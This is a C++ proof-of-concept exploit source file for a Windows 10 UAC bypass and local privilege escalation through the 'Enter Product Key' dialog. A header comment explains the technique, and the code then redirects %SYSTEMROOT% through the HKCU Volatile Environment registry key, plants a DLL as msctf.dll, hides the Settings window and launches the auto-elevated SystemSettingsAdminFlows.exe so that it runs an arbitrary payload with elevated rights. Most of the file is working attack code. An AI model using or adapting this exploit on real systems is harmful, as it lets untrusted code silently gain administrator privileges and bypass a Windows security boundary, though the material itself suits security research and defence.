/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ║                                                                                      ║
 * ║   Enter Product Key Volatile Environment UAC Bypass Local Privilege Escalation       ║
 * ║                                                                                      ║
 * ║   Discovered by bytecode77 (https://bytecode77.com)                                  ║
 * ║                                                                                      ║
 * ║   Full Download:                                                                     ║
 * ║   https://bytecode77.com/enter-product-key-privilege-escalation                      ║
 * ║                                                                                      ║
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   Windows 10 introduces the brand new "Settings" app, which provides us with fresh   ║
 * ║   and new auto-elevated binaries. The entry point of this app is                     ║
 * ║   SystemSettings.exe and the "Enter Product Key" dialog is in                        ║
 * ║   SystemSettingsAdminFlows.exe, which is auto-elevated and vulnerable to             ║
 * ║   environment variable injection.                                                    ║
 * ║                                                                                      ║
 * ║   A load attempt to %SYSTEMROOT%\System32\msctf.dll will be performed from this      ║
 * ║   auto-elevated process.                                                             ║
 * ║                                                                                      ║
 * ║   How to change %systemroot%?                                                        ║
 * ║   Simple: Through Volatile Environment.                                              ║
 * ║   Define your own %systemroot% in HKEY_CURRENT_USER\Volatile Environment and         ║
 * ║   SystemSettingsAdminFlows.exe will load msctf.dll from there.                       ║
 * ║                                                                                      ║
 * ║   We need to execute SystemSettingsAdminFlows.exe, which is dependent on             ║
 * ║   SystemSettings.exe running. So, we first start the Settings app, then inject the   ║
 * ║   environment variable and then execute SystemSettingsAdminFlows.exe with            ║
 * ║   the "EnterProductKey" argument. The second executable will load our DLL.           ║
 * ║                                                                                      ║
 * ║   For PoC, this is sufficient. However, this is a UI heavy PoC that causes visual    ║
 * ║   disturbances to the user. There are plenty of ways to mitigate visibility and      ║
 * ║   possibly avoid SystemSettings.exe altogether. However, I will not investigate      ║
 * ║   further than what is necessary to provide a functioning PoC, because this is the   ║
 * ║   sixth auto-elevation exploit that I've discovered and I'm focusing on different    ║
 * ║   techniques meanwhile posting anything I come across, like this here.               ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <string>
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <lm.h>
using namespace std;

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "netapi32.lib")

void KillSystemSettingsProcess();
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value);
wstring GetTempFolderPath();
wstring GetStartupPath();
bool GetWindowsVersion(DWORD &major, DWORD &minor);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	DWORD major, minor;
	GetWindowsVersion(major, minor);

	// Works in Windows 10 only, because of the brand new "Settings" app
	if (major >= 10)
	{
		// Prepare our working directory that is later assigned to %SYSTEMROOT% through volatile environment
		// We will also use it to put Payload.exe there - Just an example file, can be any arbitrary executable
		wstring systemRoot = GetTempFolderPath() + L"\\EnterProductKeyVolatileEnvironmentLPE";
		CreateDirectoryW(systemRoot.c_str(), NULL);
		CreateDirectoryW((systemRoot + L"\\System32").c_str(), NULL);

		// This is our DLL that is loaded and then executed as "msctf.dll"
		CopyFileW((GetStartupPath() + L"\\SystemSettingsAdminFlowsInject.dll").c_str(), (systemRoot + L"\\System32\\msctf.dll").c_str(), FALSE);

		// This is our payload. It can be any executable, but for now we just display a MessageBox with basic information and IL
		CopyFileW((GetStartupPath() + L"\\Payload.exe").c_str(), (systemRoot + L"\\Payload.exe").c_str(), FALSE);

		// Kill all previous SystemSettings.exe processes
		KillSystemSettingsProcess();

		// Start SystemSettings.exe, because it is required by SystemSettingsAdminFlows.exe
		ShellExecuteW(NULL, L"open", L"shell:AppsFolder\\Windows.ImmersiveControlPanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel", NULL, NULL, SW_SHOWNORMAL);

		// Wait for the "Settings" app to load
		for (int i = 0; i < 200; i++)
		{
			HWND window = FindWindowW(L"ApplicationFrameWindow", L"Settings");
			if (window != NULL)
			{
				// This doesn't always hide the window properly... Beyond a PoC, more work is required at this point:
				ShowWindow(window, SW_HIDE);
				break;
			}
			Sleep(10);
		}

		// Grace period for SystemSettings.exe to initialize
		Sleep(500);

		// HKEY_CURRENT_USER\Volatile Environment\SYSTEMROOT
		// -> This registry value will redirect some DLL loading attempts to the directory we just prepared
		SetRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT", systemRoot);

		// Open the "Enter Product Key" setting within the settings app
		// Continue reading in SystemSettingsAdminFlowsInject.cpp
		ShellExecuteW(NULL, L"open", L"C:\\Windows\\system32\\SystemSettingsAdminFlows.exe", L"EnterProductKey", NULL, SW_SHOWNORMAL);
	}
	return 0;
}



void KillSystemSettingsProcess()
{
	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (Process32FirstW(snapshot, &process))
	{
		do
		{
			if (StrCmpW(process.szExeFile, L"SystemSettings.exe") == 0)
			{
				BOOL result = TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, process.th32ProcessID), 0);
			}
		}
		while (Process32NextW(snapshot, &process));
	}

	CloseHandle(snapshot);
}
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}
wstring GetTempFolderPath()
{
	wchar_t path[MAX_PATH];
	GetTempPathW(MAX_PATH, path);
	return wstring(path);
}
wstring GetStartupPath()
{
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, MAX_PATH);
	wstring pathStr = wstring(path);
	return pathStr.substr(0, pathStr.find_last_of(L"/\\"));
}
bool GetWindowsVersion(DWORD &major, DWORD &minor)
{
	LPBYTE rawData = NULL;
	if (NetWkstaGetInfo(NULL, 100, &rawData) == NERR_Success)
	{
		WKSTA_INFO_100* workstationInfo = (WKSTA_INFO_100*)rawData;
		major = workstationInfo->wki100_ver_major;
		minor = workstationInfo->wki100_ver_minor;
		NetApiBufferFree(rawData);
		return true;
	}
	else
	{
		return false;
	}
}